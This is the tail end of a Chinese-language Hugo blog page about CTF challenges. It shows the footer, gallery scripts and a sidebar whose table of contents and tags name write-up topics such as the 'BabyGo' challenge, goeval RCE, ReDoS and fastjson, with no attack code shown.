+    <a href="/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">从一道题学ReDos及SQL盲注</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+  <script>
+    (function (u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+        s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/3.3.0/pangu.min.js', function () {
+      pangu.spacingPage();
+    });
+  </script>
+
+  <section class="copyright">
+    &copy;
+    
+    2020 -
+    
+    2023 <a href="">k0a1i</a>·<i class="fas fa-bell"></i>
+    <a id="days">0</a>Days<br>
+    共叨叨了13024字的废话໒・ﻌ・७</br><span>
+      
+      <p>
+  </section>
+
+  <section class="powerby">
+    Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+    Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener"
+        data-version="3.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a><br />
+    
+  </section>
+
+  <script>
+    var s1 = '2023-02-09';
+    s1 = new Date(s1.replace(/-/g, "/"));
+    s2 = new Date();
+    var days = s2.getTime() - s1.getTime();
+    var number_of_days = parseInt(days / (1000 * 60 * 60 * 24));
+    document.getElementById('days').innerHTML = number_of_days;
+  </script>
+
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+    
+    
+    <aside class="sidebar right-sidebar sticky">
+        
+            <form action="/search/" class="search-form widget" >
+        <p>
+            <label>搜索</label>
+            <input name="keyword" required placeholder="输入关键词..." />
+        
+            <button title="搜索">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+            </button>
+        </p>
+    </form>
+        
+            
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#电子木鱼">电子木鱼</a></li>
+    <li><a href="#babygo">BabyGo</a>
+      <ul>
+        <li><a href="#简单记录一下goeval的rce">简单记录一下goeval的rce</a></li>
+      </ul>
+    </li>
+    <li><a href="#吐槽碎碎念">吐槽&amp;碎碎念</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+        
+            <section class="widget categories">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">分类</h2>
+    <div class="widget-categories--list">
+        <div class="widget">
+            <h3 class="widget-title"> </h3>
+            <div class="widget-body">
+                <div class="category-list">
+                    <div class="category-list-item"><a href="https://koali-www.github.io/categories/ctf/" class="category-list-link">ctf<span class="category-list-count">6</a>
+                        </span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">归档</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2023">
+                        
+                            <span class="year">2023</span>
+                            <span class="count">3</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2022">
+                        
+                            <span class="year">2022</span>
+                            <span class="count">4</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">标签云</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/web/" class="font_size_5">
+                web
+            </a>
+        
+            <a href="/tags/java/" class="font_size_2">
+                java
+            </a>
+        
+            <a href="/tags/fastjson/" class="font_size_1">
+                fastjson
+            </a>
+        
+            <a href="/tags/go/" class="font_size_1">
+                Go
+            </a>
+        
+            <a href="/tags/hugo/" class="font_size_1">
+                Hugo
+            </a>
+        
+            <a href="/tags/jndi/" class="font_size_1">
+                jndi
+            </a>
+        
+            <a href="/tags/php/" class="font_size_1">
+                php
+            </a>
+        
+            <a href="/tags/python/" class="font_size_1">
+                python
+            </a>
+        
+            <a href="/tags/rce/" class="font_size_1">
+                rce
+            </a>
+        
+            <a href="/tags/rust/" class="font_size_1">
+                Rust
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
